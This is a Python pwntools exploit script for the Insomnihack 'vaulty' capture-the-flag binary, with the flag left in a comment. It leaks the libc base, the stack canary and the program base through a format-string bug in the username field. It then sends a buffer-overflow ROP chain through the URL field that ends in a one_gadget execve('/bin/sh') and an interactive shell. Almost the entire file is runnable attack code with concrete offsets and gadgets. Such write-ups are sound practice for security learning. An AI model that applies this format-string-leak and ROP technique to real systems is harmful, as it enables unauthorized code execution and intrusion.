#!/usr/bin/env python3

from pwn import *

elf = ELF("./vaulty", False)
libc = ELF("./libc.so.6", False)

# s = remote("vaulty.insomnihack.ch", 4556)
s = process(["./ld-linux.so.2", elf.path], env={"LD_PRELOAD":"./libc.so.6"})
# s = process(elf.path)


class VaultyApp:
	def __init__(self, session):
		self.s = session


	def CreateEntry(self, username=b'test', password=b'test', url=b'test'):
		self.s.recvuntil(b'Vault Menu:')
		self.s.sendline(b'1')
		for data in [username, password, url]:
			self.s.sendline(data)


	def ModifyEntry(self, username=b'test', password=b'test', url=b'test'):
		self.s.recvuntil(b'Vault Menu:')
		self.s.sendline(b'2')
		for data in [username, password, url]:
			self.s.sendline(data)


	def PrintEntry(self, EntryId):
		self.s.recvuntil(b'Vault Menu:')
		self.s.sendline(b'4')
		self.s.sendline( str(EntryId).encode() )



def main():

	s.info(f"Leaking addresses via the format-string vuln.....")
	LibcBase, canary, ElfBase = LeakLibcCanaryElf(s)

	libc.address = LibcBase
	elf.address = ElfBase

	s.success(f"Libc's base:	{hex(libc.address)}")
	s.success(f"Elf's base:		{hex(elf.address)}")
	s.success(f"Canary:			{hex(canary)}")

	s.info(f"Getting the RCE via the ROP with the BoF.....")
	StartRopAttack(s, canary)

	# gdb.attach(s)
	s.interactive()


# INS{An0Th3r_P4SSw0RD_m4nag3r_h4ck3d}

def LeakLibcCanaryElf( session ):
	# %3$p 	->	libc:	LibcBase + 0x114697
	# %11$p ->	canary
	# %13$p ->	return: ElfBase + 0x1984

	app = VaultyApp(session)
	app.CreateEntry( username=b"%3$p.%11$p.%13$p" )
	app.PrintEntry( 0 )
	leaks = ReadLeaks( session, separator="." )

	LibcBase = 	leaks[0] - 0x114697
	canary =	leaks[1]
	ElfBase =	leaks[2] - 0x1984

	return LibcBase, canary, ElfBase
	

def ReadLeaks( session, separator="." ):
	# b'Username: 0x7fe05d200000.0x319aedbb24a52000.0x7fe05d627000....\n'
	session.recvuntil(b'Username: ')
	BytesLine = session.recvline(False)
	StringLine = BytesLine.decode()
	StringParts = StringLine.split(separator)

	IntParts = []
	for StringPart in StringParts:
		IntParts += [int(StringPart, 16)]

	return IntParts


def StartRopAttack( session, canary ):
	# 0xebc88 execve("/bin/sh", rsi, rdx)
	# constraints:
	#   address rbp-0x78 is writable
	#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
	#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

	ONE_GADGET = 	libc.address + 0xebc88
	gRET = 			libc.address + 0x0000000000029139
	gPOP_RDX_RET = 	libc.address + 0x00000000000796a2
	gPOP_RSI_RET = 	libc.address + 0x000000000002be51

	payload = flat(
		b"a" * 40,					# offset
		p64( canary ),				# canary
		b"a" * 16,					# offset
		p64( elf.bss(0x100) ),		# rbp
		p64( gRET ) * 3,			# just in case
		p64( gPOP_RDX_RET ),		# set rdx 0
		p64( 0x0 ),
		p64( gPOP_RSI_RET ),		# set rsi 0
		p64( 0x0 ),
		p64( ONE_GADGET ),			# execve("/bin/sh", rsi, rdx)
	)

	VaultyApp(session).CreateEntry( url=payload )

if __name__=="__main__":
	main()